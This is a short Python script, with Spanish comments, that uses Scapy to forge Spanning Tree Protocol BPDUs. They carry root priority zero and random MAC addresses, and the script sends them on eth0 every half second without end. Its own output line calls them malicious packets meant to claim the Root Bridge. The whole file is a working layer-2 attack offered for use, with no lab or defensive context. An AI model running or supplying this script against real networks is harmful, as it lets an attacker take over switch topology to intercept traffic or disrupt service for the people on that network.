from scapy.all import *

iface = "eth0"

print("Enviando BPDUs maliciosas... reclamando Root Bridge")

packet = (
    Ether(dst="01:80:c2:00:00:00") /   # multicast STP
    LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
    STP(
        rootid=0x0000,      # PRIORIDAD SUPER BAJA (GANAS SIEMPRE)
        rootmac=RandMAC(), # MAC falsa
        bridgeid=0x0000,
        bridgemac=RandMAC()
    )
)

while True:
    sendp(packet, iface=iface, inter=0.5, verbose=False)
